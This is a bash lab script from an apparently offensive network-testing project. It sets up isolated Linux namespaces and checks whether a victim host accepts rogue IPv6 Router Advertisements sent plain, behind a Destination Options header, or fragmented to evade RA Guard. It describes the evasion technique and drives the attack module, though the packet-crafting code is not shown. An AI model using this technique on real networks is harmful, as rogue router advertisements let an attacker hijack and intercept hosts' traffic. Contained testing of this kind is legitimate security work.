#!/usr/bin/env bash
# IPv6 RA Guard evasion, host side (Linux only, needs root, IPv6 kernel).
#
# Topology: one bridge (the LAN) with two hosts, each in its own namespace:
#
#   victim:   a Linux host that accepts Router Advertisements. It has no default router at the start.
#   attacker: MACabre's RA Guard evasion module. It sends the advertisement in three forms.
#
# RA Guard is a switch feature, and a Linux bridge does not implement it, so this lab does not test any
# switch's filter. It tests the other half of the question: does a Linux host still process each form?
# A form that a host ignores is not useful for evasion, whatever the switch does with it.
#
# For each form the victim's default route and SLAAC address are cleared, the attacker sends its rounds,
# and the lab checks whether the victim took the attacker as its default router and configured an address in
# the advertised /64.
#
# Phases:
#   Phase 1 (control): a plain RA. The victim must accept it, or the lab exits 2 (the setup does not work).
#   Phase 2: an RA behind a Destination Options header.
#   Phase 3: an RA split across two IPv6 fragments.
#
# Exit 0 when the control holds and the host accepts both evasive forms. Exit 1 when the control holds but
# a form is not accepted. Exit 2 when the control failed.
#
# Runs in a VM with IPv6 enabled (the sandbox has no IPv6 sysctls). Nothing here touches the host's real
# network interfaces.
#
# Usage:
#   sudo scripts/lab/ipv6_ra_guard_evasion_lab.sh
#
# Requirements: iproute2 (ip, bridge), the project virtualenv (.venv) and a kernel with IPv6.
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

if [[ ! -d /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel (/proc/sys/net/ipv6 is missing). Run it in the Ubuntu VM." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
PREFIX="2001:db8:bad::/64"
PREFIX_MATCH="2001:db8:bad:"
ROUNDS=2
ATTACKER_MAC="02:00:00:00:00:50"
VICTIM_MAC="02:00:00:00:00:60"

stop_lab() {
    for ns in lan victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add attacker

for pair in "vic:victim" "atk:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge mcast_snooping 0
ip netns exec lan ip link set br0 up
for name in vic atk; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec victim ip link set h-vic address "$VICTIM_MAC"
ip netns exec victim ip link set h-vic up
ip netns exec attacker ip link set h-atk address "$ATTACKER_MAC"
ip netns exec attacker ip link set h-atk up
ip netns exec attacker ip link set h-atk promisc on

ATTACKER_LL="$("$PY" -c 'import sys; sys.path.insert(0, sys.argv[1]); from macabre.attacks.rogue_router_advertisement import link_local_from_mac as f; print(f(sys.argv[2]))' "$ROOT/src" "$ATTACKER_MAC")"

# Sends the advertisement in FORM from the attacker, for ROUNDS rounds. Prints the frames sent.
send_form() {
    local form="$1"
    ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c '
import sys, threading
from macabre.attacks.ipv6_ra_guard_evasion import RaGuardEvasionConfig, run_ra_guard_evasion
stats = run_ra_guard_evasion(
    RaGuardEvasionConfig(iface=sys.argv[1], source_mac=sys.argv[2], variant=sys.argv[3], prefix=sys.argv[4], frames=int(sys.argv[5])),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
' h-atk "$ATTACKER_MAC" "$form" "$PREFIX" "$ROUNDS" 2>/dev/null || echo 0
}

# Clears the victim's default route, the advertised prefix route and global addresses, so each form starts from
# nothing. The link-local route is left alone, so the victim keeps processing Router Advertisements.
reset_victim() {
    ip netns exec victim ip -6 route flush default dev h-vic 2>/dev/null || true
    ip netns exec victim ip -6 route flush "$PREFIX" dev h-vic 2>/dev/null || true
    ip netns exec victim ip -6 addr flush dev h-vic scope global 2>/dev/null || true
    sleep 1
}

# Prints "yes" when the victim's default router is the attacker and it has an address in the advertised /64.
accepted() {
    local default_route slaac
    default_route="$(ip netns exec victim ip -6 route show default dev h-vic 2>/dev/null || true)"
    slaac="$(ip netns exec victim ip -6 addr show dev h-vic scope global 2>/dev/null || true)"
    if grep -q "via $ATTACKER_LL" <<<"$default_route" && grep -q "$PREFIX_MATCH" <<<"$slaac"; then
        echo yes
    else
        echo no
    fi
}

# Prints the victim's IPv6 reassembly and Router Advertisement counters from /proc/net/snmp6.
counters() {
    ip netns exec victim cat /proc/net/snmp6 2>/dev/null \
        | awk '$1 == "Ip6ReasmOKs" || $1 == "Ip6ReasmFails" || $1 == "Icmp6InRouterAdvertisements" {printf "%s=%s ", $1, $2}'
}

# Prints "yes|no sent" for one form. The counters go to stderr, so the caller's read sees only the result.
run_form() {
    local form="$1"
    reset_victim
    local before sent after
    before="$(counters)"
    sent="$(send_form "$form")"
    sleep 2
    after="$(counters)"
    echo "    victim counters before: $before" >&2
    echo "    victim counters after:  $after" >&2
    echo "$(accepted)" "$sent"
}

echo "Phase 1: control, a plain RA for $PREFIX from the attacker ($ATTACKER_LL)"
read -r CONTROL SENT_1 < <(run_form plain)
echo "  frames sent: $SENT_1"
echo "  victim took the attacker as default router and configured $PREFIX: $CONTROL"
echo

echo "Phase 2: the same RA behind a Destination Options header"
read -r DESTOPT SENT_2 < <(run_form destination_options)
echo "  frames sent: $SENT_2"
echo "  victim accepted it: $DESTOPT"
echo

echo "Phase 3: the same RA split across two IPv6 fragments"
read -r FRAGMENTED SENT_3 < <(run_form fragmented)
echo "  frames sent: $SENT_3"
echo "  victim accepted it: $FRAGMENTED"
echo

if [[ "$CONTROL" != "yes" ]]; then
    echo "Control: the victim did not accept a plain RA from the attacker. Result unreliable."
    exit 2
fi
if [[ "$DESTOPT" == "yes" && "$FRAGMENTED" == "yes" ]]; then
    echo "Result: the Linux host accepts the RA in both evasive forms, so a switch RA Guard that misses them would let the advertisement reach it. The switch's own filter is not tested here. Host-side acceptance validated."
    exit 0
fi
echo "Result: the Linux host did not accept one of the evasive forms (destination options: $DESTOPT, fragmented: $FRAGMENTED). Not validated."
exit 1
